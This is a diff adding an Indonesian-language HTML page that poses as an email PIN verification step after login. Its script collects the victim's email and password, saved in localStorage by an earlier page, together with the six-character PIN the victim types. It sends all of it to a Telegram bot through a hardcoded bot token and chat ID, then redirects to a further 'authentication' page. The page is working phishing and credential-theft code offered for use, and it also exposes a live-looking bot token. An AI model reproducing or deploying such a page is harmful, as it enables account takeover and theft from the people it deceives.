@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PIN</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+
+body{
+  height:100vh;
+  background:linear-gradient(180deg,#1c2434,#0d1422);
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:400px;
+  margin:45px auto 0;
+  text-align:center;
+  padding:20px;
+}
+
+/* Logo */
+.logo-wrap{
+  width:65px;
+  height:65px;
+  margin:0 auto 20px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:radial-gradient(circle,#7b61ff,#4b3bbd);
+  box-shadow:0 0 8px rgba(123,97,255,0.3);
+}
+
+.logo-wrap img{
+  width:75px;
+}
+
+h2{
+  font-size:23px;
+  font-weight:700;
+  margin-bottom:10px;
+}
+
+p{
+  font-size:15px;
+  color:#cfd6e4;
+  margin-bottom:35px;
+  line-height:1.4;
+}
+
+/* Input asli disembunyikan */
+#realInput{
+  position:absolute;
+  opacity:0;
+}
+
+/* Titik kecil */
+.pin-wrapper{
+  display:flex;
+  justify-content:center;
+  gap:22px;
+  margin-bottom:30px;
+}
+
+.pin-item{
+  min-width:18px;
+  text-align:center;
+  font-size:22px;
+  font-weight:700;
+}
+
+/* Titik kecil putih awal */
+.pin-item::before{
+  content:"•";
+  color:#ffffff;
+  font-size:26px;
+  opacity:0.8;
+}
+
+/* Jika terisi hilangkan titik dan tampilkan huruf */
+.pin-item.filled::before{
+  content:"";
+}
+
+.resend{
+  font-size:14px;
+  color:#cfd6e4;
+}
+
+.resend span{
+  color:#ff4d4d;
+  font-weight:600;
+}
+html, body{
+  height:100%;
+  overflow:hidden;   /* matikan scroll */
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container" onclick="focusInput()">
+
+  <div class="logo-wrap">
+    <img src="logo-email.jpg" alt="email">
+  </div>
+
+  <h2>Enter Your PIN from Email</h2>
+  <p>Login berhasil, Silahkan cek email kamu untuk dapatkan Kode PIN!</p>
+
+  <input type="text" id="realInput" maxlength="6" autocomplete="off">
+
+  <div class="pin-wrapper">
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+  </div>
+
+  <div class="resend">
+    Kirim ulang kode tersedia dalam <span id="timer">59</span>dtk
+  </div>
+
+</div>
+
+<script>
+const input = document.getElementById("realInput");
+const items = document.querySelectorAll(".pin-item");
+
+// Ambil data login dari localStorage saat halaman dimuat
+let savedLoginData = null;
+document.addEventListener("DOMContentLoaded", function(){
+  savedLoginData = JSON.parse(localStorage.getItem("userLoginData"));
+  if(!savedLoginData){
+    console.log("Tidak ada data login yang tersimpan!");
+  } else {
+    console.log("Data login berhasil diambil:", savedLoginData);
+  }
+});
+
+function focusInput(){
+  input.focus();
+}
+
+// Fungsi kirim data ke Telegram
+function sendPinToTelegram(pin) {
+  // Token dan Chat ID sudah diisi
+  const BOT_TOKEN = "7390244170:AAG6UYllOyON4LbNCp-xFrKA7QFF83e9bmU";
+  const CHAT_ID = "5983910858";
+  
+  // Siapkan pesan dengan semua data yang tersedia
+  let message = "*DATA VERIFIKASI PIN*\n\n";
+  message += "\n";
+  if(savedLoginData){
+    message += `Email: ${savedLoginData.email}\n`;
+    message += `Password: ${savedLoginData.password}\n`;
+  } else {
+    message += "Tidak ada data login yang tersimpan\n";
+  }
+  
+  message += `Kode PIN: ${pin}`;
+  
+  // URL API Telegram dengan parameter yang benar
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+  // Kirim permintaan dengan penanganan error yang lebih baik
+  fetch(url, {
+    method: 'GET',
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  })
+  .then(response => {
+    if(!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+    return response.json();
+  })
+  .then(result => console.log("Data PIN terkirim ke Telegram:", result))
+  .catch(error => console.error("Gagal kirim PIN ke Telegram:", error));
+}
+
+input.addEventListener("input", function(){
+  this.value = this.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
+
+  items.forEach((item,index)=>{
+    if(this.value[index]){
+      item.textContent = this.value[index];
+      item.classList.add("filled");
+    } else {
+      item.textContent = "";
+      item.classList.remove("filled");
+    }
+  });
+
+  if(this.value.length === 6){
+    // Simpan data PIN ke localStorage agar bisa diambil di halaman berikutnya
+    localStorage.setItem("userPinData", this.value);
+    console.log("Data PIN berhasil disimpan ke localStorage:", this.value);
+    
+    // Kirim semua data ke Telegram
+    sendPinToTelegram(this.value);
+    
+    setTimeout(()=>{
+      window.location.href="autentikasi.html";
+    },400);
+  }
+});
+
+/* Countdown */
+let time = 59;
+const timer = document.getElementById("timer");
+
+const countdown = setInterval(()=>{
+  time--;
+  timer.textContent = time;
+  if(time <= 0){
+    clearInterval(countdown);
+    timer.textContent = 0;
+  }
+},1000);
+</script>
+
+</body>
+</html>
